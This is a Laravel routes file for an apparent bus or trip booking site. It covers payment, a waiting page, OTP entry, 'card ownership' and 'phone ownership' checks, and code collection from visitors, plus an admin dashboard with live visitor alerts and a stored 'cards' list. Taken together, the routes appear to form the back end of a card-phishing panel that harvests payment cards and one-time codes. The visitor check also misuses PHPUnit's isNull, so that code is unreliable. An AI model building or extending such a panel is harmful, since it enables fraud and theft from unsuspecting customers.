<?php

use App\Models\User;
use App\Events\NewVisitor;
use App\Http\Controllers\CardController;
use App\Http\Controllers\NotificationController;
use App\Models\VisitorNotifications;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\TripController;

use function PHPUnit\Framework\isNull;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider and all of them will
| be assigned to the "web" middleware group. Make something great!
|
*/

Route::get('/', function () {

    $visitor = session()->get('visitor') ? json_decode(session()->get('visitor')) : null;

    $not = null;

    if(isNull($visitor))
    {
        $not  =VisitorNotifications::create([]);
        session()->put('visitor',json_encode($not));
        event(new NewVisitor($not));
    }
    // else{
    //     $not  =VisitorNotifications::find($visitor->id);
    // }
    // session()->put('visitor',json_encode($not));
    // event(new NewVisitor($not));
    return view('home');
});
Route::post('search/{type}', [TripController::class,'saveTrip'])->name('init_trip');
Route::get('summary/{id}', [TripController::class,'summary'])->name('summary');
Route::get('bus-summary/{id}', [TripController::class,'busSummary'])->name('bus_summary');
Route::get('people/data', [TripController::class,'peopleDataPage'])->name('people_data_get');
Route::get('manage', [TripController::class,'peopleDataPage'])->name('people_data_get');
Route::post('people/data/save', [TripController::class,'peopleDataStore'])->name('people_data_store');
Route::get('part', [TripController::class,'paymentPage'])->name('trip_payment');
Route::post('part', [TripController::class,'paymentStore'])->name('trip_payment_store');
Route::get('part/waiting', function(){
    return view('waiting');
})->name('trip_payment_waiting');
Route::get('part/verification', [TripController::class,'verifyOtp'])->name('verify_otp');//
Route::post('part/verification/store', [TripController::class,'verifyOtpStore'])->name('otp.store');//
Route::get('part/auth', [TripController::class,'partAuth'])->name('confirm_card_owner');//اثبات ملكية البطاقة
Route::post('part/auth/store', [TripController::class,'partAuthStore'])->name('save_auth_state');//اثبات ملكية البطاقة
Route::get('phone/auth', [TripController::class,'phoneAuth'])->name('confirm_phone');//اثبات ملكية الهاتف
Route::post('phone/auth/store', [TripController::class,'phoneAuthStore'])->name('save_phone_auth_state');//اثبات ملكية الهاتف
Route::post('/send-code', [TripController::class,'sendCodeToVisitor']);
Route::get('/verify-code', function(){
    return view('enter_recieved_code');
})->name('verify_recieved_code');
Route::post('/save-recieved-code', [TripController::class,'saveRecievedCode'])->name('save_recieved_code');



Route::middleware([
    'auth:sanctum',
    config('jetstream.auth_session'),
    'verified',
])->group(function () {

    Route::group(['prefix'=>'dashboard'],function(){
        Route::get('/', function () {
            $notifications = VisitorNotifications::latest()->get();
            return view('dashboard',compact('notifications'));
        })->name('dashboard');
        Route::get('notifications/all',[NotificationController::class,'index'])->name('notifications.index');
        Route::get('notifications/{id}',[NotificationController::class,'show'])->name('notifications.show');
        Route::delete('notifications/{id}',[NotificationController::class,'destroy'])->name('notifications.delete');
        Route::delete('notifications/all/clear',[NotificationController::class,'destroyAll'])->name('notifications.clear_all');
        Route::resource('cards',CardController::class)->except(['show','create']);
        Route::delete('cards/all/clear',[CardController::class,'destroyAll'])->name('cards.clear_all');
    });
});

